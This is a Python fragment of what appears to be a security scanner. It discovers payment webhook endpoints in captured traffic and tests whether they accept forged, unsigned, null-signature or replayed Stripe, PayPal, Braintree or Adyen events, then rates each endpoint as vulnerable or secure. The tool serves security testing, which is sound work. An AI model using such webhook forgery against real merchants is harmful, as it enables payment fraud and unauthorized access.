            for wh_path in COMMON_WEBHOOK_PATHS:
                if path_lower.endswith(wh_path):
                    is_webhook = True
                    if "stripe" in wh_path:
                        provider = "stripe"
                    elif "paypal" in wh_path or "ipn" in wh_path:
                        provider = "paypal"
                    elif "braintree" in wh_path:
                        provider = "braintree"
                    elif "adyen" in wh_path:
                        provider = "adyen"
                    break

            req_headers = entry.get("request_data", {}).get("headers", {})
            if isinstance(req_headers, dict):
                header_keys = {k.lower() for k in req_headers}
                if "stripe-signature" in header_keys:
                    is_webhook = True
                    provider = "stripe"
                elif "paypal-transmission-sig" in header_keys:
                    is_webhook = True
                    provider = "paypal"
                elif "bt-signature" in header_keys:
                    is_webhook = True
                    provider = "braintree"

            if is_webhook and url not in seen_urls:
                seen_urls.add(url)
                endpoints.append({"url": url, "provider": provider})

        self._discovered_endpoints = endpoints
        return endpoints

    def identify_provider(
        self, endpoint_url: str, headers: dict[str, str] | None = None,
        body: str = "",
    ) -> WebhookProvider:
        """Identify the payment provider from endpoint URL and traffic."""
        url_lower = endpoint_url.lower()
        if "stripe" in url_lower:
            return WebhookProvider.STRIPE
        if "paypal" in url_lower or "ipn" in url_lower:
            return WebhookProvider.PAYPAL
        if "braintree" in url_lower:
            return WebhookProvider.BRAINTREE
        if "adyen" in url_lower:
            return WebhookProvider.ADYEN

        if headers:
            keys = {k.lower() for k in headers}
            if "stripe-signature" in keys:
                return WebhookProvider.STRIPE
            if "paypal-transmission-sig" in keys:
                return WebhookProvider.PAYPAL
            if "bt-signature" in keys:
                return WebhookProvider.BRAINTREE

        if body:
            if '"object"' in body and ('"payment_intent"' in body or '"checkout.session"' in body):
                return WebhookProvider.STRIPE
            if '"event_type"' in body and '"PAYMENT.' in body:
                return WebhookProvider.PAYPAL
            if '"pspReference"' in body or '"eventCode"' in body:
                return WebhookProvider.ADYEN

        return WebhookProvider.STRIPE

    def run_full_verification(
        self,
        endpoint_url: str,
        provider: WebhookProvider | None = None,
        send_fn: Callable[..., dict[str, Any]] | None = None,
    ) -> ForgeryReport:
        """Execute the complete forgery verification pipeline.

        Returns a ForgeryReport with:
        - signature_enforcement: which bypass methods the endpoint accepts
        - event_confusion: whether event types are discriminated
        - idempotency: whether replayed events grant duplicate access
        - forged_payloads: all payloads generated for this endpoint
        - overall_verdict: "vulnerable" / "partially_vulnerable" / "secure" / "unknown"
        """
        if provider is None:
            provider = self.identify_provider(endpoint_url)

        report = ForgeryReport(endpoint_url=endpoint_url, provider=provider)

        # Phase 1: Signature enforcement
        sig_results = self._prober.probe_signature_enforcement(
            endpoint_url, provider, send_fn,
        )
        for key in ("accepts_unsigned", "accepts_empty_secret",
                     "accepts_null_signature", "accepts_replay",
                     "accepts_wrong_event_type"):
            report.signature_enforcement[key] = sig_results.get(key, None)

        # Phase 2: Event confusion
        confusion = self._prober.probe_event_confusion(endpoint_url, send_fn)
        report.event_confusion = confusion

        # Phase 3: Idempotency
        idemp = self._prober.probe_idempotency(endpoint_url, send_fn)
        report.idempotency = idemp

        # Phase 4: Generate all bypass payloads
        report.forged_payloads = self._forger.get_common_bypass_payloads(provider)

        # Phase 5: Determine verdict
        sig_bypasses = sum(
            1 for v in report.signature_enforcement.values()
            if v is True
        )
        if sig_bypasses >= 2:
            report.overall_verdict = "vulnerable"
            report.severity = "critical"
        elif sig_bypasses == 1:
            report.overall_verdict = "partially_vulnerable"
            report.severity = "high"
        elif any(v is None for v in report.signature_enforcement.values()):
            report.overall_verdict = "unknown"
            report.severity = "unknown"
        else:
            report.overall_verdict = "secure"
            report.severity = "none"

        self._reports.append(report)
        self._total_probes += len(report.signature_enforcement) + 1
        return report

    def run_on_collected_traffic(
        self,
        collected_traffic: list[dict[str, Any]],
        send_fn: Callable[..., dict[str, Any]] | None = None,
    ) -> list[ForgeryReport]:
        """Discover endpoints from traffic and run verification on each."""
        endpoints = self.discover_webhook_endpoints(collected_traffic)
        reports: list[ForgeryReport] = []
        for ep in endpoints:
            provider = WebhookProvider(ep["provider"]) if ep["provider"] != "unknown" else None
            report = self.run_full_verification(ep["url"], provider, send_fn)
            reports.append(report)
        return reports

    def get_all_reports(self) -> list[ForgeryReport]:
        return list(self._reports)

    def get_summary(self) -> dict[str, Any]:
        vulnerable = sum(1 for r in self._reports if r.overall_verdict == "vulnerable")
        partial = sum(1 for r in self._reports if r.overall_verdict == "partially_vulnerable")
        return {
            "endpoints_discovered": len(self._discovered_endpoints),
            "endpoints_probed": len(self._reports),
            "total_probes_sent": self._total_probes,
            "vulnerable": vulnerable,
            "partially_vulnerable": partial,
            "secure": len(self._reports) - vulnerable - partial,
            "forged_payloads_generated": sum(
                len(r.forged_payloads) for r in self._reports
            ),
        }
